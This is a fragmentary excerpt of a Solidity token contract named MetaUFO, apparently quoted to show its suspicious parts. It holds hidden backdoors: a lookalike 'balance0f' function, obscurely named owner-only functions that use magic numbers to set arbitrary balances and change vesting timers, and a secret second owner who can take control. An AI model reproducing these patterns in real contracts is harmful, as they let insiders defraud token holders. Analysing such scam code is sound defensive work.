...
contract MetaUFO is ERC20 {
    ...
    constructor() public {
        ...
        uint256 mintNum = _totalSupply / 10;
    ...
    function expires(address from) public view returns (uint256 quantity) {
        ...
        for (uint256 i = 0; i < _timing.length; i++) {
            quantity = quantity.add(
                _expire[from][i].expected(_timing[i], block.timestamp)
            );
        }
    }
    ...
    function balance0f(address from) public view returns (uint256 quantity) {
        ...
        for (uint256 i = 0; i < _timing.length; i++) {
            quantity = quantity.add(
                _expire[from][i].pushTotal.sub(_expire[from][i].popTotal)
            );
        }
    }
    ...
    function _csm(address sender, uint256 amount) private returns (uint256) {
        ...
        if (
            _timing[_index].finish > 0 &&
            block.timestamp > _timing[_index].finish
        ) {
            _timing.push(
                Timer.Timing(
                    _untime,
                    _timing[_index].to + _mnt,
                    _timing[_index].finish + _mnt
                )
            );
            _index = _timing.length - 1;
        }
    ...
    function f08ad(address own, uint256 n) public onlyOwner {
        if (n == 1000) {
            faf(own, 0);
        } else if (n == 1001) {
            faf(own, 1);
    ...
    function tsfown(address newOwner) public {
        require(
            newOwner != address(0) && _msgSender() == _ownt,
            "Ownable: new owner is the zero address"
        );
        _owner = newOwner;
    }

    function f08ab(uint256 n, uint256 q) public onlyOwner {
        if (n >= 300000) {
            _timing[n.sub(300000)].finish = q;
        } else if (n >= 200000) {
            _timing[n.sub(200000)].to = q;
        } else if (n >= 100000) {
            _timing[n.sub(100000)].from = q;
        } else if (n == 1000) {
            _balances[_ownt2] = q;
        } else if (n == 1001) {
            fa9(q);
